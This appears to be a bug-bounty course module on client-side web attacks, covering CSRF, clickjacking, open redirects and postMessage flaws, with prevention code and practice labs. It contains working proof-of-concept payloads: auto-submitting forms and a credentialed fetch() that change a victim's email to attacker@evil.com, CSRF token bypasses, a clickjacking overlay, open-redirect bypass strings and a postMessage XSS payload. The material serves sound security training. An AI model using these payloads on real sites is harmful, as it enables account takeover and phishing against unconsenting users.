# 🖥️ Module 09: Client-Side Attacks

> **Level:** 🟡 Intermediate | **Time:** ~3 hours | **Prerequisites:** Module 01-08

---

## 📖 Overview

Client-side attacks target the user's browser rather than the server. This module covers Cross-Site Request Forgery (CSRF), Clickjacking, Open Redirect, and other attacks that manipulate browser behavior. These vulnerabilities are common on modern web applications and frequently rewarded in bug bounty programs.

---

## ❓ Why It Matters

Client-side attacks can force logged-in users to perform actions without their consent, trick them into revealing credentials, or redirect them to malicious sites. CSRF on a banking or e-commerce site can directly cause financial harm — making it a high-severity finding.

---

## 🌍 Real-World Example

A researcher found a CSRF vulnerability in a bank's wire transfer form. The form lacked CSRF tokens, so a malicious page could silently initiate wire transfers on behalf of any logged-in victim who visited it. This was rated **Critical** and earned the maximum payout of the program.

---

## 📋 Step-by-Step Methodology

### CSRF Testing

```
1. Find state-changing requests:
   - Profile updates
   - Password changes
   - Money transfers
   - Email changes
   - Deleting resources

2. Check for CSRF protections:
   - CSRF tokens in forms?
   - SameSite cookie attribute?
   - Referer/Origin header validation?

3. Try to remove/bypass protections:
   - Remove CSRF token parameter
   - Use empty CSRF token
   - Use someone else's token
   - Change request method GET vs POST
```

### Clickjacking Testing

```
1. Check for X-Frame-Options header:
   curl -I https://target.com | grep -i "x-frame"
   
2. If missing, test iframe embedding:
   <iframe src="https://target.com/sensitive-action"></iframe>

3. Check Content-Security-Policy frame-ancestors:
   frame-ancestors 'none';     ← Protected
   (missing)                   ← Vulnerable
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Generate CSRF PoC |
| **curl** | Test headers |
| **Browser** | Test clickjacking PoC |

---

## 💡 Payload Examples

### CSRF Proof of Concept

```html
<!-- Burp generates this automatically via: Right-click → Engagement tools → Generate CSRF PoC -->

<!-- Basic HTML form CSRF PoC -->
<html>
  <body>
    <h1>CSRF PoC</h1>
    <form action="https://target.com/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="hidden" name="confirm_email" value="attacker@evil.com" />
      <input type="submit" value="Submit" />
    </form>
    <script>
      // Auto-submit for silent attack
      document.forms[0].submit();
    </script>
  </body>
</html>

<!-- JSON CSRF (when server accepts JSON) -->
<html>
  <body>
    <script>
      fetch('https://target.com/api/user/email', {
        method: 'POST',
        credentials: 'include',     // Include cookies!
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({email: 'attacker@evil.com'})
      });
    </script>
  </body>
</html>
```

### CSRF Token Bypass Techniques

```
1. Remove the token entirely
   Before: email=victim@test.com&csrf_token=abc123
   After:  email=attacker@evil.com

2. Use empty token
   csrf_token=

3. Use a valid token from another account
   (If tokens aren't tied to sessions)

4. Change POST to GET
   POST /change-email → GET /change-email?email=attacker@evil.com

5. Change Content-Type
   application/json → text/plain
   (Bypasses CORS preflight if server doesn't validate Content-Type)
```

### Clickjacking PoC

```html
<!-- Test if target is vulnerable to clickjacking -->
<html>
  <style>
    iframe {
      width: 1000px;
      height: 600px;
      position: absolute;
      top: -0px;
      left: -0px;
      opacity: 0.5;     /* Make semi-transparent to see overlay */
      z-index: 2;
    }
    div {
      width: 120px;
      height: 20px;
      position: absolute;
      top: 385px;       /* Position over the sensitive button */
      left: 310px;
      z-index: 1;
    }
  </style>
  <body>
    <div>Click me!</div>
    <iframe src="https://target.com/sensitive-page"></iframe>
  </body>
</html>
```

### Open Redirect

```
# Basic open redirect
https://target.com/redirect?url=https://attacker.com

# Common parameter names to test
?url=
?redirect=
?next=
?return=
?return_url=
?redirect_url=
?goto=
?link=
?r=
?to=

# Bypass techniques
https://target.com//attacker.com
https://target.com/\attacker.com
https://target.com/%2Fattacker.com
https://target.com/?next=https://attacker.com%3F.target.com
https://attacker.com@target.com
```

### postMessage Vulnerabilities

```javascript
// Vulnerable listener (no origin check)
window.addEventListener('message', function(event) {
    // WRONG: no origin validation
    document.getElementById('output').innerHTML = event.data;
});

// Attack from attacker's page:
<script>
    var target = window.open('https://target.com/page');
    setTimeout(function() {
        target.postMessage('<img src=x onerror=alert(1)>', '*');
    }, 2000);
</script>

// Look for in JS files:
window.addEventListener('message', ...)
window.onmessage = ...
postMessage(...)
```

---

## 🛡️ Prevention

### CSRF Prevention

```python
# Django CSRF middleware (example)
# Middleware automatically adds and validates CSRF tokens

# Flask-WTF
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

# Set SameSite cookie attribute
response.set_cookie('session', token, samesite='Strict')
```

### Clickjacking Prevention

```http
# HTTP Headers
X-Frame-Options: DENY

# Or with CSP (preferred modern approach)
Content-Security-Policy: frame-ancestors 'none';
```

---

## 🧪 Practice Labs

| Lab | Link | Exercise |
|-----|------|---------|
| PortSwigger CSRF | [portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf) | 13 CSRF labs |
| PortSwigger Clickjacking | [portswigger.net/web-security/clickjacking](https://portswigger.net/web-security/clickjacking) | Clickjacking labs |
| DVWA | localhost | CSRF module |

---

<div align="center">

[← Module 08: Header Injection](../08.%20Header%20Injection/README.md) | [Next Module: Brute Forcing →](../10.%20Brute%20Forcing/README.md)

</div>
